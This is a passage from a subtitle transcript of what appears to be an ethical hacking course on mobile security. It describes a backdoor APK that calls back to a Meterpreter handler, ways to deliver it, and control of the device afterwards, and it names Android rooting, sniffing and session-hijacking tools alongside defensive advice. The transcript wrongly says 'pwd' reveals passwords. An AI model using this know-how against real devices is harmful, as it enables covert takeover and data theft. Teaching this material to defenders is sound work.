browser.\n\n553\n00:27:32.440 --> 00:27:33.370\nPretty innocuous, right?\n\n554\n00:27:33.370 --> 00:27:37.390\nSo we could open the web browser in\nthe device, we would be able to go browse,\n\n555\n00:27:37.390 --> 00:27:39.210\nyou just go to the web,\ndo a bunch of stuff.\n\n556\n00:27:39.210 --> 00:27:43.706\nBut if through that, we went in and either\nwe went through, no leave that up for\n\n557\n00:27:43.706 --> 00:27:44.329\na second.\n\n558\n00:27:44.329 --> 00:27:46.230\nLet's not go off there yet,\njust give me a second.\n\n559\n00:27:46.230 --> 00:27:49.230\nSo if we were to go through\nhypothetically, right, and\n\n560\n00:27:49.230 --> 00:27:52.985\nwe were to either through the web browser,\nbrowse and find a share or\n\n561\n00:27:52.985 --> 00:27:55.615\ndownload object where\nthis APK had been stored.\n\n562\n00:27:55.615 --> 00:27:59.785\nSo, in theory, let's say it was your\ndrive by attack or it was an iFrame or\n\n563\n00:27:59.785 --> 00:28:03.590\nit was sitting somewhere, or we managed\nto secret this into the app store.\n\n564\n00:28:03.590 --> 00:28:08.180\nAnd actually were able to get it as\nan app, download either an image.\n\n565\n00:28:08.180 --> 00:28:11.930\nWe could maybe put this into an image\nthrough steganography or something.\n\n566\n00:28:11.930 --> 00:28:15.230\nWe may be able to grab some sort\nof file that's been compromised.\n\n567\n00:28:15.230 --> 00:28:18.610\nSo there's all these different ways\nthat we could potentially do this.\n\n568\n00:28:18.610 --> 00:28:22.450\nIf we were able to exploit\nthis on the system,\n\n569\n00:28:22.450 --> 00:28:24.238\nwe then actually could launch this.\n\n570\n00:28:24.238 --> 00:28:27.000\nAnd then we could connect back, which is\nwhy I wanted to stay here for a second.\n\n571\n00:28:27.000 --> 00:28:29.940\n&gt;&gt; Okay.\n&gt;&gt; This package's backdoor APK file would\n\n572\n00:28:29.940 --> 00:28:31.730\nessentially call home,\n\n573\n00:28:31.730 --> 00:28:35.510\nconnect back to this payload handler\nthat's sitting here in Kali, waiting.\n\n574\n00:28:35.510 --> 00:28:36.930\n&gt;&gt; So, this guy's just listening for\na call.\n\n575\n00:28:36.930 --> 00:28:40.530\n&gt;&gt; And this would now become the remote\ncontrol that would launch and\n\n576\n00:28:40.530 --> 00:28:42.750\nultimately take over the system, right?\n\n577\n00:28:42.750 --> 00:28:47.850\nAnd so, when we do that, the backdoor APK\nfile essentially now gets installed and\n\n578\n00:28:47.850 --> 00:28:51.260\nwe're now able to actually go in and\ncontrol the device.\n\n579\n00:28:51.260 --> 00:28:52.874\nIt's kind of interesting, but\n\n580\n00:28:52.874 --> 00:28:56.104\nthe application would then\nessentially take over the device and\n\n581\n00:28:56.104 --> 00:28:59.689\nwe would be able to see, although\nwe're not gonna through that part but\n\n582\n00:28:59.689 --> 00:29:03.842\nwe would then see ultimately, we'll see\nthe meter preter session has been open.\n\n583\n00:29:03.842 --> 00:29:07.550\nAnd we would then be able to ultimately\ngo in and start issuing commands whenever\n\n584\n00:29:07.550 --> 00:29:09.770\nwould essentially allow us\nto take over the device.\n\n585\n00:29:09.770 --> 00:29:13.080\nSo, it would be kind of interesting right,\nif we went all the way through.\n\n586\n00:29:13.080 --> 00:29:15.440\nAnd we would then be able to interact.\n\n587\n00:29:15.440 --> 00:29:18.130\nWe could android sysinfo command.\n\n588\n00:29:18.130 --> 00:29:21.320\nWe'd be able to get the display\ninformation for the target machine.\n\n589\n00:29:21.320 --> 00:29:23.610\nWe'd be able to see all that information,\n\n590\n00:29:23.610 --> 00:29:26.620\nblue planning, the attack we talked\nabout where we get the information.\n\n591\n00:29:26.620 --> 00:29:28.620\n&gt;&gt; We could pull down the OS information.\n\n592\n00:29:28.620 --> 00:29:30.190\nWe could do an IP config.\n\n593\n00:29:30.190 --> 00:29:32.160\nWe'd be able to look at IP addresses.\n\n594\n00:29:32.160 --> 00:29:36.410\nWe'd be able to program in and deal with\nthings, do an ls command for instance,\n\n595\n00:29:36.410 --> 00:29:40.480\nthrough the shell, list all the files in\nthere, be able to take a look at anything.\n\n596\n00:29:40.480 --> 00:29:43.810\nWe could change directories very simply,\nissue an SD command,\n\n597\n00:29:43.810 --> 00:29:45.990\nmaybe SD, rather a CD.\n\n598\n00:29:45.990 --> 00:29:46.883\nSD, listen to me.\n\n599\n00:29:46.883 --> 00:29:48.575\n&gt;&gt; [LAUGH]\n&gt;&gt; CD, I'm thinking SD card for\n\n600\n00:29:48.575 --> 00:29:49.800\nthe directory.\n\n601\n00:29:49.800 --> 00:29:52.120\nWe could do a CD/SD card.\n\n602\n00:29:52.120 --> 00:29:55.970\nGo into the onboard storage or\nremote storage, that's removable.\n\n603\n00:29:55.970 --> 00:29:57.760\nTake a look at what's in there.\n\n604\n00:29:57.760 --> 00:30:01.487\nWe could go in and enter, or type, pwd.\n\n605\n00:30:01.487 --> 00:30:03.768\nAnd we would then be able to go in and\n\n606\n00:30:03.768 --> 00:30:08.410\ntake a look at the password\ninformation and all that kinda stuff.\n\n607\n00:30:08.410 --> 00:30:12.430\nWe can make directories, we can do\nanything we wanted in here essentially.\n\n608\n00:30:12.430 --> 00:30:15.180\nWe can own the device once we set this up.\n\n609\n00:30:15.180 --> 00:30:18.156\nAnd so as a result,\nwe would be able to go in and\n\n610\n00:30:18.156 --> 00:30:21.595\nwould be able to root the device\nif we wanted to, right?\n\n611\n00:30:21.595 --> 00:30:22.570\n&gt;&gt; Mm-hm.\n\n612\n00:30:22.570 --> 00:30:23.910\n&gt;&gt; We could do anything we wanted.\n\n613\n00:30:23.910 --> 00:30:27.200\nThis kind of an attack would\nactually be incredibly powerful\n\n614\n00:30:27.200 --> 00:30:28.380\nif we were to fully exploit it.\n\n615\n00:30:28.380 --> 00:30:30.570\nWe're just really kinda\nstarting with the basics.\n\n616\n00:30:30.570 --> 00:30:32.010\n&gt;&gt; I was hoping this was gonna be cool.\n\n617\n00:30:32.010 --> 00:30:33.220\nThat's why I got so excited.\n\n618\n00:30:33.220 --> 00:30:34.131\n&gt;&gt; This is pretty cool, right?\n\n619\n00:30:34.131 --> 00:30:35.840\n&gt;&gt; [LAUGH]\n&gt;&gt; If we had convinced somebody to give\n\n620\n00:30:35.840 --> 00:30:37.130\nus their phone, it would have been\n&gt;&gt; [LAUGH]\n\n621\n00:30:37.130 --> 00:30:38.060\n&gt;&gt; Even gore right?\n\n622\n00:30:38.060 --> 00:30:40.955\nBut that part was a little tough but\nthe rest was kind of cool,\n\n623\n00:30:40.955 --> 00:30:41.474\n&gt;&gt; [LAUGH]\n\n624\n00:30:41.474 --> 00:30:43.348\n&gt;&gt; But you obviously were stopping short,\n\n625\n00:30:43.348 --> 00:30:44.291\nall kidding aside.\n\n626\n00:30:44.291 --> 00:30:47.756\nWe're stopping short of doing certain\nthings in the demo here that would give\n\n627\n00:30:47.756 --> 00:30:50.902\nyou information, that would not only\nmake you armed and dangerous but\n\n628\n00:30:50.902 --> 00:30:55.200\nobviously could be misconstrued and\nmisused potentially, right, in the wild.\n\n629\n00:30:55.200 --> 00:30:57.090\nThe idea here of being able to just go in.\n\n630\n00:30:57.090 --> 00:30:58.740\nThe idea here of being\nable to just go in and\n\n631\n00:30:58.740 --> 00:31:02.320\nshow you how to launch the attack\nfrom the server side and\n\n632\n00:31:02.320 --> 00:31:06.150\nthen leave up to you filling in the gaps\naround how you would then propagate that\n\n633\n00:31:06.150 --> 00:31:10.350\nAPK into a system as we've explained\nthree or four vectors that could be used.\n\n634\n00:31:10.350 --> 00:31:12.270\nWe're giving you the opportunity\nto fill in the blanks.\n\n635\n00:31:12.270 --> 00:31:15.240\nSo to speak without showing\nyou all the steps in between.\n\n636\n00:31:15.240 --> 00:31:19.440\nIt's purposeful, right, because we don't\nwant to necessarily expose all that\n\n637\n00:31:19.440 --> 00:31:21.640\nknowledge and\ninformation in the wrong hands, right?\n\n638\n00:31:21.640 --> 00:31:25.040\nSo we wanna be a little bit cautious\nabout that but you get the general idea.\n\n639\n00:31:25.040 --> 00:31:29.060\nFrom the description, it would not be hard\nto surmise how that may take place and\n\n640\n00:31:29.060 --> 00:31:29.870\nwhat may go on there.\n\n641\n00:31:29.870 --> 00:31:32.190\nSo some interesting stuff, hopefully.\n\n642\n00:31:32.190 --> 00:31:35.400\nKeep in mind, as we think about\nmultiple platform vulnerabilities,\n\n643\n00:31:35.400 --> 00:31:38.700\nclearly malicious apps in the App Store\nis probably up near the top.\n\n644\n00:31:38.700 --> 00:31:44.740\nApplication vulnerabilities, malcode in\ngeneral is really just a huge issue today.\n\n645\n00:31:44.740 --> 00:31:49.028\nAlso wanna think about the fact that we\nare essentially running apps in a sandbox\n\n646\n00:31:49.028 --> 00:31:51.077\non a device a lot of the times, right.\n\n647\n00:31:51.077 --> 00:31:55.697\nBlackberry has their own built in sandbox,\nAndroid does, Apple does in one form or\n\n648\n00:31:55.697 --> 00:31:56.296\nanother.\n\n649\n00:31:56.296 --> 00:31:59.574\nBut if the sandbox protections are weak,\nthen that can also be an issue.\n\n650\n00:31:59.574 --> 00:32:01.325\nIt can lead to memory bleed and\n\n651\n00:32:01.325 --> 00:32:05.590\nlead to exploits getting out from\nwithin the sandbox in the system.\n\n652\n00:32:05.590 --> 00:32:08.890\nIf we purposely violate the sandbox\nby moving information in and\n\n653\n00:32:08.890 --> 00:32:11.840\nout of it in a way that's insecure,\nthat can also lead to a problem.\n\n654\n00:32:11.840 --> 00:32:13.770\nAnd so something else to consider.\n\n655\n00:32:13.770 --> 00:32:17.010\nApp stores are only as good as\nthe front end of authentication.\n\n656\n00:32:17.010 --> 00:32:20.150\nGoogle does to their credit as\ndoes Apple to their credit and\n\n657\n00:32:20.150 --> 00:32:22.130\nMicrosoft which also has one.\n\n658\n00:32:22.130 --> 00:32:22.960\nA very good job,\n\n659\n00:32:22.960 --> 00:32:27.186\nprimarily, and almost without\nexemption always, of vetting stuff.\n\n660\n00:32:27.186 --> 00:32:31.170\nBut even there, even under the strictest\nof conditions, multiple scans,\n\n661\n00:32:31.170 --> 00:32:35.600\ndifferent engines being used,\nmultiple ways to have to authenticate to\n\n662\n00:32:35.600 --> 00:32:40.085\nbecome a value rather authorized\nvendor to add apps into the store.\n\n663\n00:32:40.085 --> 00:32:44.630\nEven then, exploit code has snuck\nthrough in all three of those systems so\n\n664\n00:32:44.630 --> 00:32:47.030\nit is something to consider and\nbe aware of.\n\n665\n00:32:47.030 --> 00:32:49.706\nMaking sure you have a secure\nversus vulnerable sandboxes,\n\n666\n00:32:49.706 --> 00:32:51.310\nas I said is very important.\n\n667\n00:32:51.310 --> 00:32:53.250\nWe do get mobile spam, right?\n\n668\n00:32:53.250 --> 00:33:01.214\n&gt;&gt; Mm hmm.\n&gt;&gt; So we have to be aware of that as well.\n\n669\n00:33:01.214 --> 00:33:03.013\nUnsolicited messaging of any kind.\n\n670\n00:33:03.013 --> 00:33:07.229\nWe do get SMS phishing attacks,\nwe call them smishing.\n\n671\n00:33:07.229 --> 00:33:10.613\nSMS or smis, sheng, feng,\nsheng, whatever feng shui.\n\n672\n00:33:10.613 --> 00:33:12.110\n&gt;&gt; [LAUGH]\n&gt;&gt; Smishing right?\n\n673\n00:33:12.110 --> 00:33:15.340\nSo just make sure you know that we do\nhave SMS phishing attacks just like\n\n674\n00:33:15.340 --> 00:33:16.270\neverywhere else.\n\n675\n00:33:16.270 --> 00:33:18.530\nVia text in other words is what\nwe're talking about there.\n\n676\n00:33:18.530 --> 00:33:20.420\nSo this can be very problematic.\n\n677\n00:33:20.420 --> 00:33:23.340\nPeople texting you and\nI'm just constantly amazed.\n\n678\n00:33:23.340 --> 00:33:25.240\nWe talked about this\nat some point earlier.\n\n679\n00:33:25.240 --> 00:33:29.170\nWith just the number of communication\nmechanisms that really today\n\n680\n00:33:29.170 --> 00:33:33.330\nare just not only on this device, but\nyou're using text for almost everything.\n\n681\n00:33:33.330 --> 00:33:36.980\nI mean I have customers that will only\ncommunicate with me via text and just\n\n682\n00:33:36.980 --> 00:33:40.470\nlike, hey, what are you doing and when are\nyou gonna come and yeah, but that's it.\n\n683\n00:33:40.470 --> 00:33:41.340\nAnd I'm one of those people.\n\n684\n00:33:41.340 --> 00:33:43.150\nI really prefer, I do not like e-mail.\n\n685\n00:33:43.150 --> 00:33:44.610\nI'm just not a big proponent of email.\n\n686\n00:33:44.610 --> 00:33:45.490\nI understand it.\n\n687\n00:33:45.490 --> 00:33:46.890\nI understand why it's valuable.\n\n688\n00:33:46.890 --> 00:33:47.670\nI hate texting.\n\n689\n00:33:47.670 --> 00:33:49.990\nI just think it's the absolute\nworst thing in the world.\n\n690\n00:33:49.990 --> 00:33:50.990\nAnd I'm one of those people,\n\n691\n00:33:50.990 --> 00:33:54.330\nI wanna talk to you face to face because\nI think it's important to have context.\n\n692\n00:33:54.330 --> 00:33:57.420\nI think it's important to have\nthe ability to have body language.\n\n693\n00:33:57.420 --> 00:34:00.350\nAnd I want you to feel comfortable\nexplaining things to me and\n\n694\n00:34:00.350 --> 00:34:02.110\nlooking me in the eye and vice versa.\n\n695\n00:34:02.110 --> 00:34:05.300\nSo that way, we can communicate and\nreally understand each other.\n\n696\n00:34:05.300 --> 00:34:09.440\nAnd that's just me, which is neither\nhere nor there, it's just how I am.\n\n697\n00:34:09.440 --> 00:34:14.240\nBut this is important, because in today's\nworld, less and less of that is going on.\n\n698\n00:34:14.240 --> 00:34:14.750\n&gt;&gt; Yes.\n\n699\n00:34:14.750 --> 00:34:20.710\n&gt;&gt; And I am constantly, in my organisation\nas well, everybody's emailing or texting,\n\n700\n00:34:20.710 --> 00:34:23.620\nand I am the one who picks up the phone,\nand walks over and talks to you in person.\n\n701\n00:34:23.620 --> 00:34:25.080\nAnd people just don't get that today.\n\n702\n00:34:25.080 --> 00:34:26.240\nWhy can't you just?\n\n703\n00:34:26.240 --> 00:34:29.240\nBecause that's not how I do it.\n\n704\n00:34:29.240 --> 00:34:31.760\n&gt;&gt; I walk out the door and\nI go over and I respond to them and\n\n705\n00:34:31.760 --> 00:34:35.290\nthey're like why don't you just email\nme back, because you're right there.\n\n706\n00:34:35.290 --> 00:34:37.540\nI want you to see me telling you.\n\n707\n00:34:37.540 --> 00:34:41.960\nLike you said, that body language,\nyou don't get that in text.\n\n708\n00:34:41.960 --> 00:34:43.680\nYou don't get the context\nthat goes with it.\n\n709\n00:34:43.680 --> 00:34:44.450\n&gt;&gt; Well, there's no subtlety.\n\n710\n00:34:44.450 --> 00:34:46.150\nThere's no context of any kind.\n\n711\n00:34:46.150 --> 00:34:49.000\nYou don't have a sense and then you know\nyou get people that don't understand\n\n712\n00:34:49.000 --> 00:34:51.375\nthe medium, so\nthey are putting everything in caps.\n\n713\n00:34:51.375 --> 00:34:52.853\nScreaming out you are a little mean to.\n\n714\n00:34:52.853 --> 00:34:55.510\nYeah,there are language issues and\nbarriers there,sometimes\n\n715\n00:34:55.510 --> 00:34:57.788\npeople don't always understand\nhow to communicate effectively.\n\n716\n00:34:57.788 --> 00:34:59.120\nIt's like anything else.\n\n717\n00:34:59.120 --> 00:35:01.690\nIt's, yeah, it's all that.\n\n718\n00:35:01.690 --> 00:35:04.960\n&gt;&gt; I have to go find a teenager\nto figure out how to decode this\n\n719\n00:35:04.960 --> 00:35:06.170\nmessage half the time.\n\n720\n00:35:06.170 --> 00:35:09.350\n&gt;&gt; Yeah. Yeah. Five emoticons and\na special character.\n\n721\n00:35:09.350 --> 00:35:10.410\n&gt;&gt; Three letters.\n\n722\n00:35:10.410 --> 00:35:11.500\n&gt;&gt; Yeah and in your world.\n\n723\n00:35:11.500 --> 00:35:14.100\nSee I can imagine like\n10,000 years from now\n\n724\n00:35:14.100 --> 00:35:17.330\ntheir gonna unearth instead of the cave\ndrawings like in Lacroix, right.\n\n725\n00:35:17.330 --> 00:35:20.116\nOr you know any of these\nfabulous drawings that they find.\n\n726\n00:35:20.116 --> 00:35:23.370\nThey're gonna earth somebody's\nskeletal hand, right.\n\n727\n00:35:23.370 --> 00:35:27.250\nAnd a device, and there's gonna be\non this stuff on this device, and\n\n728\n00:35:27.250 --> 00:35:29.690\ntheir gonna be like this how\nthey used to communicate.\n\n729\n00:35:29.690 --> 00:35:31.290\nThere was no spoken language.\n\n730\n00:35:31.290 --> 00:35:35.210\nIt was all pictograms, and\nbasically it was like hieroglyphs, but\n\n731\n00:35:35.210 --> 00:35:36.910\nit was just electronic.\n\n732\n00:35:36.910 --> 00:35:40.710\nAnd there's gonna be like this whole\nmissing gap of 2,000 years of spoken and\n\n733\n00:35:40.710 --> 00:35:43.610\nwritten knowledge, because none\nof the books are gonna survive.\n\n734\n00:35:43.610 --> 00:35:44.350\nThey're gonna burn them all.\n\n735\n00:35:44.350 --> 00:35:46.580\n&gt;&gt; And they're gonna have to try to\nfind some Rosetta Stone to put it all\n\n736\n00:35:46.580 --> 00:35:47.342\nback together.\n\n737\n00:35:47.342 --> 00:35:48.091\n[LAUGH]\n&gt;&gt; Right, so\n\n738\n00:35:48.091 --> 00:35:49.710\nthey're gonna have to find, exactly.\n\n739\n00:35:49.710 --> 00:35:51.160\nRight.\nSo they're gonna have to find like\n\n740\n00:35:51.160 --> 00:35:55.350\nthis translation device that actually\nshows that there was an English, and or\n\n741\n00:35:55.350 --> 00:35:57.500\nother language which is Chinese,\nGerman, French, whatever.\n\n742\n00:35:57.500 --> 00:36:03.845\nThere was like a spoken written language\nnot just this crazy, stupid smiley face.\n\n743\n00:36:03.845 --> 00:36:08.835\n&gt;&gt; [LAUGH]\n&gt;&gt; Emoticon, the evil laughing emoticon.\n\n744\n00:36:08.835 --> 00:36:11.085\nSo it's just, it is.\n\n745\n00:36:11.085 --> 00:36:12.255\nI don't even know what to say.\n\n746\n00:36:12.255 --> 00:36:13.015\nI'm babbling.\n\n747\n00:36:13.015 --> 00:36:14.015\nIt's just crazy.\n\n748\n00:36:14.015 --> 00:36:16.475\nSo when you think about this,\nall kidding aside,\n\n749\n00:36:16.475 --> 00:36:20.275\none of the interesting things that I've\nfound recently in doing some research, and\n\n750\n00:36:20.275 --> 00:36:22.825\ntalking to people and\njust thinking about different ways\n\n751\n00:36:22.825 --> 00:36:26.920\nthat this kind of stuff impacts security,\nand the issues, and concerns around it.\n\n752\n00:36:26.920 --> 00:36:31.060\nSo I haven't seen this done in production,\nI haven't seen it done as an exploit.\n\n753\n00:36:31.060 --> 00:36:33.610\nI haven't seen it really outside\nof just my thought process, and\n\n754\n00:36:33.610 --> 00:36:37.150\nthinking about it and talking about\nit with some peers and colleagues.\n\n755\n00:36:37.150 --> 00:36:40.590\nBut, it is an interesting thought process,\nwhich is when we think about translating\n\n756\n00:36:40.590 --> 00:36:43.840\ncommunication into something\nlike that text stream.\n\n757\n00:36:43.840 --> 00:36:46.050\nHow protected is that text stream?\n\n758\n00:36:46.050 --> 00:36:48.460\nSo for\ninstance it's running on the cell carrier.\n\n759\n00:36:48.460 --> 00:36:49.480\nWe know there are records of it.\n\n760\n00:36:49.480 --> 00:36:52.340\nWe know it's not hard to pick that\noff potentially, and yet more and\n\n761\n00:36:52.340 --> 00:36:56.550\nmore people are putting very sensitive\ninformation into those things, and\n\n762\n00:36:56.550 --> 00:37:00.630\nthose transcripts are available and/or\nare stored on the device right.\n\n763\n00:37:00.630 --> 00:37:03.510\nSo again could you pick\nthat information off?\n\n764\n00:37:04.730 --> 00:37:06.570\nWould not be hard to do at all.\n\n765\n00:37:06.570 --> 00:37:10.630\nAre there and there are by the way,\ncloud versions of these transcripts at\n\n766\n00:37:10.630 --> 00:37:13.620\nthe carriers that are stored for\na period of time in their systems.\n\n767\n00:37:13.620 --> 00:37:16.610\nSo can other people get\naccess to that absolutely.\n\n768\n00:37:16.610 --> 00:37:17.830\nCan somebody clone your phone?\n\n769\n00:37:17.830 --> 00:37:18.340\nYes they can.\n\n770\n00:37:18.340 --> 00:37:19.940\nCan they see all that data if they do?\n\n771\n00:37:19.940 --> 00:37:20.980\nAbsolutely.\n\n772\n00:37:20.980 --> 00:37:24.120\nSo this kind of stuff is again\nsomething to think about.\n\n773\n00:37:24.120 --> 00:37:26.990\nHow secure is it transmitting\nthe password via text.\n\n774\n00:37:26.990 --> 00:37:29.610\nIt's an out of band\ncommunication mechanism.\n\n775\n00:37:29.610 --> 00:37:31.440\nIt is secure in the sense\nnobody is gonna see it.\n\n776\n00:37:31.440 --> 00:37:33.560\nIt's unidirectional communication, but\n\n777\n00:37:33.560 --> 00:37:35.920\nhow do you know who you're\ncommunicating with on the other side?\n\n778\n00:37:35.920 --> 00:37:38.630\nAgain could have somebody cloned that\ndevice or have taken it over, and\n\n779\n00:37:38.630 --> 00:37:40.730\nyou may not know who you're talking to,\nright,\n\n780\n00:37:40.730 --> 00:37:43.100\ncuz you don't really have\nan authentication mechanism at all.\n\n781\n00:37:43.100 --> 00:37:46.710\nYou're sending it into the cloud in\ntheory, right, just through the ether.\n\n782\n00:37:46.710 --> 00:37:49.090\nWhen I say the cloud it means\nyou're sending it out there, right.\n\n783\n00:37:49.090 --> 00:37:52.680\nAnd you're assuming the telephone\nnumber on the other side or the chat ID\n\n784\n00:37:52.680 --> 00:37:55.810\non the other side is legitimately\ncontrolled by the party you're talking to.\n\n785\n00:37:55.810 --> 00:37:57.090\nBut you have no way of knowing that.\n\n786\n00:37:57.090 --> 00:37:59.980\nThere is no authentication\non that system whatsoever.\n\n787\n00:37:59.980 --> 00:38:00.480\n&gt;&gt; Mm.\n&gt;&gt; Right?\n\n788\n00:38:00.480 --> 00:38:01.210\nCuz we could send to\n\n789\n00:38:01.210 --> 00:38:05.200\nany device on the planet that's\nhooked up to an IP address and\n\n790\n00:38:05.200 --> 00:38:07.090\nhas an endpoint on any carrier network.\n\n791\n00:38:07.090 --> 00:38:07.760\n&gt;&gt; Yes.\n&gt;&gt; And\n\n792\n00:38:07.760 --> 00:38:09.720\nthere's absolutely zero authentication.\n\n793\n00:38:09.720 --> 00:38:11.100\n&gt;&gt; Nope.\n&gt;&gt; The only authentication is\n\n794\n00:38:11.100 --> 00:38:13.293\nthat you are an authenticated\nuser on your carrier network.\n\n795\n00:38:13.293 --> 00:38:16.490\nAnd that there's a hand off between\nyour carrier network and the other one.\n\n796\n00:38:16.490 --> 00:38:20.280\nBut, I could text a stranger and\nI would have no idea who they are, and\n\n797\n00:38:20.280 --> 00:38:24.130\nthey have no idea who I am, and\nthere is no way to know, absolutely none.\n\n798\n00:38:24.130 --> 00:38:27.650\nYet we're sending more and more secure\ninformation across these devices.\n\n799\n00:38:27.650 --> 00:38:28.801\nIf you think about it all the time.\n\n800\n00:38:28.801 --> 00:38:31.070\nI mean this is what keeps me up at night,\nright.\n\n801\n00:38:31.070 --> 00:38:35.920\nYou wanna talk about reasons why I\npause and I think about these things.\n\n802\n00:38:35.920 --> 00:38:38.520\nThis is the kind of stuff\nas a security professional,\n\n803\n00:38:38.520 --> 00:38:40.490\nas somebody who does this all the time.\n\n804\n00:38:40.490 --> 00:38:41.540\nAs a researcher,\n\n805\n00:38:41.540 --> 00:38:43.790\nas somebody who writes on this stuff\nI'm thinking about these things.\n\n806\n00:38:43.790 --> 00:38:45.970\nAnd I'm not the first one to\ncome up with this by the way.\n\n807\n00:38:45.970 --> 00:38:49.378\nBut, this is the kind of stuff that I\nhave to worry about in a corporate world,\n\n808\n00:38:49.378 --> 00:38:52.118\nwhen I'm advising customers and\ndealing with these issues.\n\n809\n00:38:52.118 --> 00:38:55.008\nIf you're using this is as an out\nof band communication channel,\n\n810\n00:38:55.008 --> 00:38:57.910\nhow secure is this and\ndo your really know who you're sending to?\n\n811\n00:38:57.910 --> 00:38:59.242\n&gt;&gt; Right.\n&gt;&gt; And the answer is no, you don't and\n\n812\n00:38:59.242 --> 00:39:00.480\nyou know that's an issue.\n\n813\n00:39:00.480 --> 00:39:02.800\nWe have to think about\ndevice administration\u007f APIs.\n\n814\n00:39:02.800 --> 00:39:05.540\nA lot of these are proprietary for\nthe platform.\n\n815\n00:39:05.540 --> 00:39:10.690\nGoogle's is relatively benign but\nthere are issues buried in those things.\n\n816\n00:39:10.690 --> 00:39:11.340\nWhat about rooting?\n\n817\n00:39:11.340 --> 00:39:13.060\nWe talked about rooting and\njailbreaking, right.\n\n818\n00:39:13.060 --> 00:39:15.880\nAnd so rooting and\njailbreaking devices, big issue.\n\n819\n00:39:15.880 --> 00:39:19.500\nAnd if you are rooting, and\nwe actually have a definition.\n\n820\n00:39:19.500 --> 00:39:22.240\nI didn't give it to you did I,\ndarn no I did not give it to you.\n\n821\n00:39:22.240 --> 00:39:24.910\nI have it I forgot to give\nit to you I forgot to\n\n822\n00:39:24.910 --> 00:39:26.900\nsend it to you I'm going to\nbring it up we'll talk about it.\n\n823\n00:39:26.900 --> 00:39:30.425\nBut we have three different\nkinds of jailbreaking that we\n\n824\n00:39:30.425 --> 00:39:32.555\njust wanna talk about and\nmake sure we're aware of.\n\n825\n00:39:32.555 --> 00:39:33.555\nAnd I wanna just talk about them.\n\n826\n00:39:33.555 --> 00:39:36.345\nSo I'll bring them up and I'll just\ntalk about them on my screen here in\n\n827\n00:39:36.345 --> 00:39:38.185\njust a minute instead of\nhaving you flash them up.\n\n828\n00:39:38.185 --> 00:39:40.354\nAnd I can give it to you,\nwe'll put it up after the fact.\n\n829\n00:39:40.354 --> 00:39:41.170\n&gt;&gt; [CROSSTALK]\n&gt;&gt; Yeah, but rooting and\n\n830\n00:39:41.170 --> 00:39:41.984\njailbreaking, right.\n\n831\n00:39:41.984 --> 00:39:47.101\nReally important to understand we can\nroot and/or jailbreak any device.\n\n832\n00:39:47.101 --> 00:39:51.236\nWe just have to get in underneath\nthe running OS and load another kernel and\n\n833\n00:39:51.236 --> 00:39:53.850\nessentially swap it in so\nwe can gain control.\n\n834\n00:39:53.850 --> 00:39:54.932\nAnd so we do wanna know that.\n\n835\n00:39:54.932 --> 00:39:55.932\nWe can root Android phones.\n\n836\n00:39:55.932 --> 00:39:56.755\nNot hard to do.\n\n837\n00:39:56.755 --> 00:40:01.260\nThings like Super One Click\ncan be used to root Android.\n\n838\n00:40:01.260 --> 00:40:04.470\nSuper Boot, another one that is very\ncommon in root Android devices.\n\n839\n00:40:04.470 --> 00:40:08.970\nSo One Click Root,\nall these kinda ones are out there.\n\n840\n00:40:08.970 --> 00:40:10.350\nSo there's a lot of different ones.\n\n841\n00:40:10.350 --> 00:40:11.330\nAndroid's pretty popular.\n\n842\n00:40:11.330 --> 00:40:13.940\nObviously a lot of people\nare going out and doing that.\n\n843\n00:40:13.940 --> 00:40:14.780\nHacking networks,\n\n844\n00:40:14.780 --> 00:40:18.570\nusing a tool like Network Spoofer on\na mobile networks can be done as well.\n\n845\n00:40:18.570 --> 00:40:22.270\nRight so you can go in and you can change\nwebsites and other people's computers from\n\n846\n00:40:22.270 --> 00:40:26.160\nan Android phone using this tool, which is\nkind of interesting on the Android device.\n\n847\n00:40:26.160 --> 00:40:30.510\nAnd I am focusing more and more on Android\ntools, grudgingly just because Blackberry\n\n848\n00:40:30.510 --> 00:40:33.760\nis moving in that direction and so\nI'm going to essentially have to.\n\n849\n00:40:33.760 --> 00:40:37.170\nBut we do have a tool called Droid Cheap\nwhich is a session hi-jacking\n\n850\n00:40:37.170 --> 00:40:38.590\ntool that can be used as well.\n\n851\n00:40:38.590 --> 00:40:42.210\nKind of interesting, there's Face Sniff\nwhich is an Android based sniffer.\n\n852\n00:40:42.210 --> 00:40:45.450\nI've mentioned there are sniffer products\nthat I use and this is an Android based\n\n853\n00:40:45.450 --> 00:40:47.980\nsniffer you can use on a mobile\ndevice to be able to do sniffing.\n\n854\n00:40:47.980 --> 00:40:48.830\nSo kind of cool.\n\n855\n00:40:48.830 --> 00:40:51.670\nYou can sniff and\nintercept web session profiles and\n\n856\n00:40:51.670 --> 00:40:54.580\nsee all sorts of really cool stuff there.\n\n857\n00:40:54.580 --> 00:40:55.940\nSo we could do all that.\n\n858\n00:40:55.940 --> 00:41:00.150\nThere is the Android PCAP tool,\nso you could go in and use that.\n\n859\n00:41:00.150 --> 00:41:02.290\nThere is ZIPMO which\nis Zeus in the mobile,\n\n860\n00:41:02.290 --> 00:41:04.470\nwhich is also a kind of interesting one.\n\n861\n00:41:04.470 --> 00:41:08.250\nThere's all these different ones\nthere that you can use on Android.\n\n862\n00:41:08.250 --> 00:41:10.235\nYou have the same kind of concept and\n\n863\n00:41:10.235 --> 00:41:13.990\nthought process associated\nwith any of the platforms.\n\n864\n00:41:13.990 --> 00:41:16.100\nBut think about securing these devices,\nright?\n\n865\n00:41:16.100 --> 00:41:19.600\nScreen lock out, so make sure you lock\nout your device if you're not using it.\n\n866\n00:41:19.600 --> 00:41:23.660\nUse whatever the fullest extent of the\nfactor authentication solutions may be.\n\n867\n00:41:23.660 --> 00:41:28.600\nIf it's a PIN or if it's a password or\nwhatever or some combination.\n\n868\n00:41:28.600 --> 00:41:29.410\nThink about that.\n\n869\n00:41:29.410 --> 00:41:31.570\nWe can remotely wipe a lot of these tools.\n\n870\n00:41:31.570 --> 00:41:35.030\nWe'll give your mobile device management\ntools give us remote wipe capabilities.\n\n871\n00:41:35.030 --> 00:41:36.210\nWant to think about that.\n\n872\n00:41:36.210 --> 00:41:38.870\nWhat about something like\nDroid Sheep Guard, which is an Android\n\n873\n00:41:38.870 --> 00:41:43.210\nsecurity tools set that could be used\nto monitor the ARP table on the phone.\n\n874\n00:41:43.210 --> 00:41:44.880\nGives you popup alerts,\n\n875\n00:41:44.880 --> 00:41:49.758\ndisables wifi connections if we see\nthat there's inbound traffic coming in.\n\n876\n00:41:49.758 --> 00:41:53.030\nIf we look and monitor for\nour based attacks,\n\n877\n00:41:53.030 --> 00:41:55.590\nas you saw me do in some\nof the other episodes.\n\n878\n00:41:55.590 --> 00:41:56.350\nSo things like that.\n\n879\n00:41:56.350 